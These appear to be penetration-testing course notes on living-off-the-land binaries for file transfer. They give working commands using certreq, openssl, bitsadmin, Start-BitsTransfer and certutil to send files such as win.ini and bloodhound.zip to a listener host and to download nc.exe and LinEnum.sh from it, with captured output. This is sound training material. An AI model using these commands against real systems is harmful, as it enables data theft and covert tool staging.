## LOLBins
* `LOLBins` (Living off the Land binaries)
	-   Download
	-   Upload
	-   Command Execution
	-   File Read
	-   File Write
	-   Bypasses

## Using the LOLBAS and GTFOBins Project
### LOLBAS
* To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`
* Example for `CerReq.exe`

```powershell
certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini

Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

```sh
$ sudo nc -lvnp 80

listening on [any] 80 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### GTFOBins
* To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`
* For example OpenSSL

```sh
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

```sh
$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

```sh
$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Other Common Living off the Land tools
#### File Download with Bitsadmin
```powershell
PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

#### Download
```powershell
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

#### Upload
```powershell
PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

### Certutil
```powershell
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

